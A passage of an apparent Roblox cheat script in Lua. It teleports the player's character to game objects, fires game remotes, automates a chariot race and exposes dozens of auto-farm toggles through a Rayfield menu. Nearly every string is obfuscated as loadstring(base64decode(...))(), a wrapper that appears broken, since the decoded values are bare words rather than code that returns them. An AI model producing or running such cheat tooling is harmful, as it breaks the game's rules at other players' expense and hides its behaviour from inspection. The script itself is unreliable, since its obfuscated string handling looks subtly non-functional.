                rootPart = mobChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    or mobChar:FindFirstChild(loadstring(base64decode("VG9yc28="))())
                    or mobChar.PrimaryPart
                    or mobChar:FindFirstChildWhichIsA(loadstring(base64decode("QmFzZVBhcnQ="))())
                humanoid = mobChar:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
            end
            if not rootPart then rootPart = mobModel:FindFirstChild(loadstring(base64decode("VkZYUGFydA=="))()) end
            if not rootPart then
                rootPart = mobModel:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    or mobModel.PrimaryPart
                    or mobModel:FindFirstChildWhichIsA(loadstring(base64decode("QmFzZVBhcnQ="))(), true)
            end
            if not humanoid then humanoid = mobModel:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))()) end

            if humanoid and humanoid.Health <= 0 then
                local id = mobModel:GetDebugId() or tostring(mobModel)
                visitedTrialMobs[id] = true
            elseif rootPart and rootPart.Parent and ((humanoid and humanoid.Health > 0) or not humanoid) then
                local id = mobModel:GetDebugId() or tostring(mobModel)
                if not visitedTrialMobs[id] then
                    table.insert(mobs, {
                        Root = rootPart,
                        Humanoid = humanoid,
                        Name = mobModel.Name,
                        ID = id,
                        Model = mobModel
                    })
                end
            end
        end
    end)
    return mobs
end

local function getCapsulePosition(capsuleType)
    local gc = workspace:FindFirstChild(loadstring(base64decode("X19HQU1FX0NPTlRFTlQ="))())
    if not gc then return nil end
    local uizones = gc:FindFirstChild(loadstring(base64decode("VUlab25lcw=="))())
    if not uizones then return nil end
    local capsule = uizones:FindFirstChild(loadstring(base64decode("X19DYXBzdWxl"))() .. capsuleType)
    if capsule and capsule:FindFirstChild(loadstring(base64decode("VG91Y2hQYXJ0"))()) then
        return capsule.TouchPart.Position
    end
    return nil
end

local function teleportToCapsule(capsuleType)
    local pos = getCapsulePosition(capsuleType)
    if pos then moveTo(pos, 1.5, useTweenCapsules) return true end
    return false
end

local function doCapsuleOnce(capsuleType)
    if capsulesHandled[capsuleType] then return end
    if teleportToCapsule(capsuleType) then
        task.wait(1.0)
        fireMain(loadstring(base64decode("VG9nZ2xlTWluaW9uQXV0b09wZW4="))(), capsuleType)
        capsulesHandled[capsuleType] = true
    end
end

local function resetCapsulesHandled()
    for k in pairs(capsulesHandled) do capsulesHandled[k] = false end
end

local function runEnabledCapsulesOnce()
    if autoClassicEnabled then doCapsuleOnce(loadstring(base64decode("Q2xhc3NpYw=="))()) end
    if autoSuperEnabled then doCapsuleOnce(loadstring(base64decode("U3VwZXI="))()) end
    if autoAncientEnabled then doCapsuleOnce(loadstring(base64decode("QW5jaWVudA=="))()) end
    if autoCosmicEnabled then doCapsuleOnce(loadstring(base64decode("Q29zbWlj"))()) end
    if autoYinYangEnabled then doCapsuleOnce(loadstring(base64decode("WWluIFlhbmc="))()) end
    if autoFootballEnabled then doCapsuleOnce(loadstring(base64decode("Rm9vdGJhbGw="))()) end
end

local function teleportToRuneZone(runeTier)
    local gc = workspace:FindFirstChild(loadstring(base64decode("X19HQU1FX0NPTlRFTlQ="))())
    if not gc then return false end
    local runeZones = gc:FindFirstChild(loadstring(base64decode("UnVuZVpvbmVz"))())
    if not runeZones then return false end
    local tierFolder = runeZones:FindFirstChild(runeTier)
    if tierFolder and tierFolder:FindFirstChild(loadstring(base64decode("X1pvbmVfUnVuZV9Sb2xs"))()) then
        moveTo(tierFolder._Zone_Rune_Roll.Position, 1.5, useTweenRunes)
        return true
    end
    return false
end

local function teleportToCosmicPrism() return teleportToRuneZone(loadstring(base64decode("Q29zbWljIFByaXNt"))()) end
local function teleportToHackerRune() return teleportToRuneZone(loadstring(base64decode("SGFja2Vy"))()) end
local function teleportToSnowyRune() return teleportToRuneZone(loadstring(base64decode("U25vd3k="))()) end
local function teleportToDeepCoreRune()
    pcall(function()
        local folder = workspace.__GAME_CONTENT.RuneZones.Deepcore
        if folder and folder:FindFirstChild(loadstring(base64decode("RmxvYXRpbmdQYXJ0"))()) then
            moveTo(folder.FloatingPart.Position, 1.5, useTweenRunes)
        end
    end)
end
local function teleportToDuneRune()
    pcall(function()
        local folder = workspace.__GAME_CONTENT.RuneZones.Dunes
        if folder and folder:FindFirstChild(loadstring(base64decode("RmxvYXRpbmdQYXJ0"))()) then
            moveTo(folder.FloatingPart.Position, 1.5, useTweenRunes)
        end
    end)
end
local function teleportToSunfire()
    pcall(function()
        local part = workspace.__GAME_CONTENT.RuneZones.Sunfire._Zone_Rune_Roll
        if part then moveTo(part.Position, 1.5, useTweenRunes) end
    end)
end
local function teleportToSunstormPrism()
    pcall(function()
        local part = workspace.__GAME_CONTENT.RuneZones[loadstring(base64decode("U3Vuc3Rvcm0gUHJpc20="))()]._Zone_Rune_Roll
        if part then moveTo(part.Position, 1.5, useTweenRunes) end
    end)
end
local function teleportToShard()
    pcall(function()
        local part = workspace.__GAME_CONTENT.RuneZones.Shard._Zone_Rune_Roll
        if part then moveTo(part.Position, 1.5, useTweenRunes) end
    end)
end
local function teleportToStarlight()
    pcall(function()
        local part = workspace.__GAME_CONTENT.RuneZones.Starlight._Zone_Rune_Roll
        if part then moveTo(part.Position, 1.5, useTweenRunes) end
    end)
end
local function teleportToCosma()
    pcall(function()
        local part = workspace.__GAME_CONTENT.RuneZones.Cosma._Zone_Rune_Roll
        if part then moveTo(part.Position, 1.5, useTweenRunes) end
    end)
end
local function teleportToDarkRune()
    pcall(function()
        local part = workspace.__GAME_CONTENT.RuneZones.Dark._Zone_Rune_Roll
        if part then moveTo(part.Position, 1.5, useTweenRunes) end
    end)
end
local function teleportToLightRune()
    pcall(function()
        local part = workspace.__GAME_CONTENT.RuneZones.Light._Zone_Rune_Roll
        if part then moveTo(part.Position, 1.5, useTweenRunes) end
    end)
end
local function teleportToUnderwater()
    pcall(function()
        local part = workspace.__GAME_CONTENT.RuneZones.Underwater._Zone_Rune_Roll
        if part then moveTo(part.Position, 1.5, useTweenRunes) end
    end)
end

local function resumePostTrialSystems()
    pcall(function()
        if autoSandLayerRestart then teleportToSandTop() task.wait(0.4) end
        if autoCollectChipsEnabled then
            local root = getRoot()
            local chip = workspace.__GAME_CONTENT.Contents[loadstring(base64decode("V09STEQgLSA0"))()].Chips[loadstring(base64decode("MQ=="))()].Main
            if root and chip and chip:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                root.CFrame = CFrame.new(chip.Position + Vector3.new(0, 3, 0))
            end
            task.wait(0.3)
        end
        if autoMergeChipsEnabled then
            local root = getRoot()
            local mergeBtn = workspace.__GAME_CONTENT.Contents[loadstring(base64decode("V09STEQgLSA0"))()].Chips.ChipMergeButton
            local part = mergeBtn and (mergeBtn:FindFirstChildWhichIsA(loadstring(base64decode("QmFzZVBhcnQ="))(), true) or mergeBtn.PrimaryPart)
            if root and part then root.CFrame = CFrame.new(part.Position + Vector3.new(0, 3, 0)) end
            task.wait(0.3)
        end
        resetCapsulesHandled()
        runEnabledCapsulesOnce()
    end)
end

local function getTrenchPart(name)
    local ok, part = pcall(function()
        return workspace.__GAME_CONTENT.OceanTrench:FindFirstChild(name)
    end)
    if ok and part and part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then return part end
    return nil
end

local function runAutoOystersCycle()
    local entrance = getTrenchPart(loadstring(base64decode("RW50cmFuY2U="))())
    if entrance then instantTo(entrance.Position) task.wait(0.8) end
    local seafloor = getTrenchPart(loadstring(base64decode("U2VhZmxvb3I="))())
    if seafloor then tweenToTrench(seafloor.Position, trenchTweenSpeed) task.wait(0.5) end
    fireMain(loadstring(base64decode("TGVhdmVUcmVuY2g="))())
    task.wait(2.0)
    local fill = getTrenchPart(loadstring(base64decode("RmlsbFpvbmU="))())
    if fill then instantTo(fill.Position) task.wait(1.4) end
end

local function selectColosseumWave(wave)
    wave = math.clamp(tonumber(wave) or 1, 1, 650)
    selectedColosseumWave = wave
    fireMain(loadstring(base64decode("U2VsZWN0Q29sb3NzZXVtV2F2ZQ=="))(), wave)
end

local function startAutoChariot()
    if chariotBound then return end
    local ok, err = pcall(function()
        local Chariot = require(RS.Shared.Modules.Chariot)
        local col = player:WaitForChild(loadstring(base64decode("RkVBVFVSRVM="))()):WaitForChild(loadstring(base64decode("Q0hBUklPVA=="))())
        local track = Chariot.BuildTrack(workspace:WaitForChild(loadstring(base64decode("Q2hhcmlvdA=="))(), 10))
        if not track or not track.center then
            error(loadstring(base64decode("Q2hhcmlvdCB0cmFjayBub3QgZm91bmQ="))())
        end

        local char = player.Character or player.CharacterAdded:Wait()
        char:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())

        local progress = tonumber(col.Progress.Value) or 0
        local behind = (progress - Chariot.GetPushOffset(track)) % track.circumference
        local foot = Chariot.GetTrackPoint(track, behind, 0)
        local ahead = Chariot.GetTrackPoint(track, behind + 2, 0)

        char:PivotTo(CFrame.lookAt(
            foot + Vector3.new(0, 3, 0),
            ahead + Vector3.new(0, 3, 0)
        ))

        task.wait(chariotStartDelay)

        if not autoChariotEnabled then return end

        RunService:BindToRenderStep(loadstring(base64decode("QnJvc3dlQ2hhcmlvdE1vdmU="))(), Enum.RenderPriority.Input.Value, function()
            if not autoChariotEnabled then return end
            local c = player.Character
            local hum = c and c:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
            local root = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            if not hum or not root then return end

            local angle = math.atan2(
                root.Position.Z - track.center.Z,
                root.Position.X - track.center.X
            )
            hum:Move(Vector3.new(-math.sin(angle), 0, math.cos(angle)), false)
        end)
        chariotBound = true
    end)
    if not ok then
        Rayfield:Notify({Title = loadstring(base64decode("QXV0byBDaGFyaW90"))(), Content = loadstring(base64decode("RmFpbGVkOiA="))() .. tostring(err), Duration = 5})
        autoChariotEnabled = false
        chariotBound = false
    end
end

local function stopAutoChariot()
    pcall(function()
        RunService:UnbindFromRenderStep(loadstring(base64decode("QnJvc3dlQ2hhcmlvdE1vdmU="))())
    end)
    chariotBound = false
end

-- ====================== UI ======================
HalloweenTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfkbsgR2hvc3QgVXBncmFkZXMg4pWQ4pWQ4pWQ"))())
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIGdob3N0cw=="))(), CurrentValue = false, Callback = function(v) autoMoreGhostsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBzaGFycGVyIHNjeXRoZQ=="))(), CurrentValue = false, Callback = function(v) autoSharperScytheEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBmYXN0ZXIgc2N5dGhlIElJ"))(), CurrentValue = false, Callback = function(v) autoFasterScythe2Enabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBzb3VsIGx1Y2s="))(), CurrentValue = false, Callback = function(v) autoSoulLuckEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBILk1hc3RlcnkgWFA="))(), CurrentValue = false, Callback = function(v) autoHMasteryXPEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHNwb29reSBvb2Y="))(), CurrentValue = false, Callback = function(v) autoMoreSpookyOofGhostEnabled = v end})

HalloweenTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfjoMgU3Bvb2t5IE9vZiBVcGdyYWRlcyDilZDilZDilZA="))())
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFNwb29reSBPb2Y="))(), CurrentValue = false, Callback = function(v) autoSpookyOofMoreSpookyOofEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIGdob3N0cw=="))(), CurrentValue = false, Callback = function(v) autoSpookyOofMoreGhostsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBGYXN0ZXIgSC5Ob29icw=="))(), CurrentValue = false, Callback = function(v) autoFasterHNoobsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHB1bXBraW5z"))(), CurrentValue = false, Callback = function(v) autoMorePumpkinsSpookyEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHB1bXBraW4="))(), CurrentValue = false, Callback = function(v) autoMorePumpkinSpookyEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHN3ZWV0cyBJSQ=="))(), CurrentValue = false, Callback = function(v) autoMoreSweets2SpookyEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFB1bXBraW4gWFA="))(), CurrentValue = false, Callback = function(v) autoMorePumpkinXP34Enabled = v end})

HalloweenTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfjawgU3dlZXQgVXBncmFkZXMg4pWQ4pWQ4pWQ"))())
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHN3ZWV0cw=="))(), CurrentValue = false, Callback = function(v) autoMoreSweetsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHN3ZWV0cyBJSQ=="))(), CurrentValue = false, Callback = function(v) autoMoreSweets2Enabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBmYXN0ZXIgaG91c2Vz"))(), CurrentValue = false, Callback = function(v) autoFasterHousesEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBzcGVjaWFsIGx1Y2s="))(), CurrentValue = false, Callback = function(v) autoSpecialLuckEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHB1bXBraW5z"))(), CurrentValue = false, Callback = function(v) autoMorePumpkinSweetsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIGdob3N0cw=="))(), CurrentValue = false, Callback = function(v) autoMoreGhostSweetsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlU3Bvb2t5T29m"))(), CurrentValue = false, Callback = function(v) autoMoreSpookyOofSweetsEnabled = v end})

HalloweenTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfjL0gQXV0byBDYW5keSBDb3JuIE1pbGVzdG9uZXMg4pWQ4pWQ4pWQ"))())
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTcG9va3kgT29m"))(), CurrentValue = false, Callback = function(v) autoMilestoneSpookyOofEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBnaG9zdHM="))(), CurrentValue = false, Callback = function(v) autoMilestoneGhostsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBQdW1wa2lucw=="))(), CurrentValue = false, Callback = function(v) autoMilestonePumpkinsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTd2VldHM="))(), CurrentValue = false, Callback = function(v) autoMilestoneSweetsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBILlJ1bmUgTHVjaw=="))(), CurrentValue = false, Callback = function(v) autoMilestoneHRuneLuckEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBILlJ1bmUgQnVsaw=="))(), CurrentValue = false, Callback = function(v) autoMilestoneHRuneBulkEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBjYW5keSBjb3Ju"))(), CurrentValue = false, Callback = function(v) autoMilestoneCandyCornEnabled = v end})

HalloweenTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfjoMgUHVtcGtpbiBVcGdyYWRlcyDilZDilZDilZA="))())
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHB1bXBraW5z"))(), CurrentValue = false, Callback = function(v) autoPumpkinMorePumpkinsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBldmVuIG1vcmUgcHVtcGtpbnM="))(), CurrentValue = false, Callback = function(v) autoPumpkinEvenMorePumpkinsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBmYXN0ZXIgZ3Jvd3Ro"))(), CurrentValue = false, Callback = function(v) autoPumpkinFasterGrowthEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFB1bXBraW4gWFA="))(), CurrentValue = false, Callback = function(v) autoPumpkinMorePumpkinXPEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHNwb29reSBvb2Y="))(), CurrentValue = false, Callback = function(v) autoPumpkinMoreSpookyOofEnabled = v end})

HalloweenTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfjL4gQXV0byBQdW1wa2luIEhhcnZlc3Qg4pWQ4pWQ4pWQ"))())
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBoYXJ2ZXN0IGFsbA=="))(), CurrentValue = false, Callback = function(v) autoHarvestPumpkinsEnabled = v end})

HalloweenTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfkbsgU3Bvb2t5IE9vZiBNaWxlc3RvbmVzIOKVkOKVkOKVkA=="))())
HalloweenTab:CreateToggle({Name = loadstring(base64decode("U3Bvb2t5IE9vZiBNaWxlc3RvbmUgVXA="))(), CurrentValue = false, Callback = function(v) autoSpookyOofMilestoneUpEnabled = v end})

HalloweenTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfp58gQXV0byBSZWFwZXIgTm9vYnMgKEV2ZW50IE1vYnMpIOKVkOKVkOKVkA=="))())
HalloweenTab:CreateToggle({Name = loadstring(base64decode("QXV0byBSZWFwZXIgTm9vYnMgKEJvc3NlcyAmIE1vYnMp"))(), CurrentValue = false, Callback = function(v) autoAutoReaperNoobsEnabled = v end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("SW5zdGFudCBUZWxlcG9ydCAoUmVhcGVyIE5vb2JzKQ=="))(), CurrentValue = false, Callback = function(v) if v then useTweenReaperMobs = false end end})
HalloweenTab:CreateToggle({Name = loadstring(base64decode("U21vb3RoIFR3ZWVuIChSZWFwZXIgTm9vYnMp"))(), CurrentValue = true, Callback = function(v) if v then useTweenReaperMobs = true end end})

Realm1Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCflKUgUmViaXJ0aCDilZDilZDilZA="))())
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBSZWJpcnRo"))(), CurrentValue = false, Callback = function(v) autoRebirthEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBQcmVzdGlnZQ=="))(), CurrentValue = false, Callback = function(v) autoPrestigeEnabled = v end})
Realm1Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCflKUgRmlyZSDilZDilZDilZA="))())
Realm1Tab:CreateToggle({Name = loadstring(base64decode("TW9yZSBPb2ZzIChGaXJlKQ=="))(), CurrentValue = false, Callback = function(v) autoFireMoreOofEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("TW9yZSBGaXJl"))(), CurrentValue = false, Callback = function(v) autoFireMoreFireEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("TW9yZSBSZWJpcnRocyAoRmlyZSk="))(), CurrentValue = false, Callback = function(v) autoFireMoreRebirthEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("TW9yZSBCdWxrIChGaXJlKQ=="))(), CurrentValue = false, Callback = function(v) autoFireMoreBulkEnabled = v end})
Realm1Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCflKUgQmxhemUg4pWQ4pWQ4pWQ"))())
Realm1Tab:CreateToggle({Name = loadstring(base64decode("TW9yZSBCbGF6ZQ=="))(), CurrentValue = false, Callback = function(v) autoBlazeMoreBlazeEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("TW9yZSBPb2ZzIChCbGF6ZSk="))(), CurrentValue = false, Callback = function(v) autoBlazeMoreOofEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("TW9yZSBGaXJlIChCbGF6ZSk="))(), CurrentValue = false, Callback = function(v) autoBlazeMoreFireEnabled = v end})
Realm1Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfkrAgQ2FzaCDilZDilZDilZA="))())
Realm1Tab:CreateToggle({Name = loadstring(base64decode("TW9yZSBDYXNo"))(), CurrentValue = false, Callback = function(v) autoCashMoreCashEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("RmFzdGVyIERyb3BwZXI="))(), CurrentValue = false, Callback = function(v) autoCashFasterDropperEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("TW9yZSBSdW5lIEx1Y2sgKENhc2gp"))(), CurrentValue = false, Callback = function(v) autoCashMoreRuneLuckEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBUeWNvb24gUmVzZXQ="))(), CurrentValue = false, Callback = function(v) autoTycoonResetEnabled = v end})
Realm1Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfpJYgTm9vYnMg4pWQ4pWQ4pWQ"))())
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBTdGFydGVy"))(), CurrentValue = false, Callback = function(v) autoStarterNoobEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb29rZXI="))(), CurrentValue = false, Callback = function(v) autoCookerNoobEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBGYXJtZXI="))(), CurrentValue = false, Callback = function(v) autoFarmerEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBBcmNoZXI="))(), CurrentValue = false, Callback = function(v) autoArcherEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBTb2xkaWVy"))(), CurrentValue = false, Callback = function(v) autoSoldierEnabled = v end})
Realm1Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfj60gRmFjdG9yeSDilZDilZDilZA="))())
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBUaWVyIDE="))(), CurrentValue = false, Callback = function(v) autoTier1Enabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBUaWVyIDI="))(), CurrentValue = false, Callback = function(v) autoTier2Enabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBUaWVyIDM="))(), CurrentValue = false, Callback = function(v) autoTier3Enabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBUaWVyIDQ="))(), CurrentValue = false, Callback = function(v) autoTier4Enabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBUaWVyIDU="))(), CurrentValue = false, Callback = function(v) autoTier5Enabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBUaWVyIDY="))(), CurrentValue = false, Callback = function(v) autoTier6Enabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBUaWVyIDc="))(), CurrentValue = false, Callback = function(v) autoTier7Enabled = v end})
Realm1Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfjbMgQ29va2luZyDilZDilZDilZA="))())
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDYWtl"))(), CurrentValue = false, Callback = function(v) autoCakeEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDaGVlc2U="))(), CurrentValue = false, Callback = function(v) autoCheeseEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb29raWU="))(), CurrentValue = false, Callback = function(v) autoCookieEnabled = v end})
Realm1Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfkIQgQW5pbWFscyDilZDilZDilZA="))())
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDaGlja2VuICgxKQ=="))(), CurrentValue = false, Callback = function(v) autoChicken1Enabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDaGlja2VuICgyKQ=="))(), CurrentValue = false, Callback = function(v) autoChicken2Enabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb3cgKDEp"))(), CurrentValue = false, Callback = function(v) autoCow1Enabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb3cgKDIp"))(), CurrentValue = false, Callback = function(v) autoCow2Enabled = v end})
Realm1Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfqpkgQ29pbnMg4pWQ4pWQ4pWQ"))())
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBFeGNoYW5nZQ=="))(), CurrentValue = false, Callback = function(v) autoExchangeEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIEVnZ3M="))(), CurrentValue = false, Callback = function(v) autoMoreEggsEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIE1pbGs="))(), CurrentValue = false, Callback = function(v) autoMoreMilkEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFJ1bmUgTHVjaw=="))(), CurrentValue = false, Callback = function(v) autoMoreRuneLuckCoinEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFJ1bmUgU3BlZWQ="))(), CurrentValue = false, Callback = function(v) autoMoreRuneSpeedEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFJ1bmUgQnVsaw=="))(), CurrentValue = false, Callback = function(v) autoMoreRuneBulkCoinEnabled = v end})
Realm1Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFRpZXIgTHVjaw=="))(), CurrentValue = false, Callback = function(v) autoMoreTierLuckEnabled = v end})

Realm2Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKdhO+4jyBSZWFsbSAyIOKVkOKVkOKVkA=="))())
Realm2Tab:CreateLabel(loadstring(base64decode("U25vd3kgJiBEZWVwIENvcmUg4oaSIFJ1bmVzIHRhYg=="))())

Realm3Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfj5zvuI8gU2FuZCDilZDilZDilZA="))())
Realm3Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFNhbmQ="))(), CurrentValue = false, Callback = function(v) autoMoreSandEnabled = v end})
Realm3Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBTdHJvbmdlciBTaG92ZWxz"))(), CurrentValue = false, Callback = function(v) autoStrongerShovelsEnabled = v end})
Realm3Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIE9vZg=="))(), CurrentValue = false, Callback = function(v) autoMoreOofEnabled = v end})
Realm3Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBTaG92ZWwgTGV2ZWw="))(), CurrentValue = false, Callback = function(v) autoShovelLevelEnabled = v end})
Realm3Tab:CreateDropdown({
    Name = loadstring(base64decode("UmVzdGFydCBhdCBMYXllcg=="))(),
    Options = {loadstring(base64decode("MTA="))(),loadstring(base64decode("MjU="))(),loadstring(base64decode("NTA="))(),loadstring(base64decode("NzU="))(),loadstring(base64decode("MTAw"))(),loadstring(base64decode("MTUw"))(),loadstring(base64decode("MjAw"))(),loadstring(base64decode("MjUw"))(),loadstring(base64decode("MzAw"))(),loadstring(base64decode("NDAw"))(),loadstring(base64decode("NTAw"))()},
    CurrentOption = {loadstring(base64decode("NTA="))()},
    Callback = function(option)
        if type(option) == loadstring(base64decode("dGFibGU="))() then selectedSandLayer = tonumber(option[1]) or 50
        else selectedSandLayer = tonumber(option) or 50 end
    end
})
Realm3Tab:CreateToggle({
    Name = loadstring(base64decode("QXV0byBTYW5kIExheWVycw=="))(),
    CurrentValue = false,
    Callback = function(v)
        autoSandLayerRestart = v
        if v then
            pcall(function()
                local root = getRoot()
                local title = workspace.__GAME_CONTENT.Contents[loadstring(base64decode("V09STEQgLSAz"))()].SandLayer.SandTitle
                if root and title and title:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                    root.CFrame = CFrame.new(title.Position + Vector3.new(0, 5, 0))
                end
            end)
        end
    end
})
Realm3Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfjZYgTWVhdCDilZDilZDilZA="))())
Realm3Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIE1lYXQ="))(), CurrentValue = false, Callback = function(v) autoMoreMeatEnabled = v end})
Realm3Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBTdHJvbmdlciBTd29yZHM="))(), CurrentValue = false, Callback = function(v) autoStrongerSwordsEnabled = v end})
Realm3Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIE9vZnM="))(), CurrentValue = false, Callback = function(v) autoMeatMoreOofEnabled = v end})
Realm3Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIEJvbmVz"))(), CurrentValue = false, Callback = function(v) autoMoreBonesEnabled = v end})

Realm4Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKtkCBTdGFycyDilZDilZDilZA="))())
